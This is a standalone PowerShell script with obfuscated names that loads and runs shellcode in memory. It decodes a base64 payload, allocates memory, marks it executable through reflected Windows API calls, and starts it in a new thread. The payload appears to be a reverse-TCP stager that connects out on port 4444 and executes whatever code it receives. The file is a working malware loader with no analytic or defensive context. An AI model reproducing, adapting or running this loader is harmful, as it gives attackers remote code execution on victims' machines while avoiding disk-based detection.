function mj {
        Param ($kA, $fWb)
        $nQwNc = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $nQwNc.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($nQwNc.GetMethod('GetModuleHandle')).Invoke($null, @($kA)))), $fWb))
}

function iOr {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $xcww,
                [Parameter(Position = 1)] [Type] $tVZ = [Void]
        )

        $ty9e = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ty9e.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $xcww).SetImplementationFlags('Runtime, Managed')
        $ty9e.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $tVZ, $xcww).SetImplementationFlags('Runtime, Managed')

        return $ty9e.CreateType()
}

[Byte[]]$d4x0 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSUVZlSItSYEiLUhhIi1IgSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBJAdBQi0gY41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcfwAAAUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$nH = 0
$hY2 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mj kernel32.dll VirtualAlloc), (iOr @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $d4x0.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($d4x0, 0, $hY2, $d4x0.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mj kernel32.dll VirtualProtect), (iOr @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($hY2, [Uint32]$d4x0.Length, 0x10, [Ref]$nH)) -eq $true) {
        $ynQ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mj kernel32.dll CreateThread), (iOr @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$hY2,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mj kernel32.dll WaitForSingleObject), (iOr @([IntPtr], [Int32]))).Invoke($ynQ,0xffffffff) | Out-Null
}
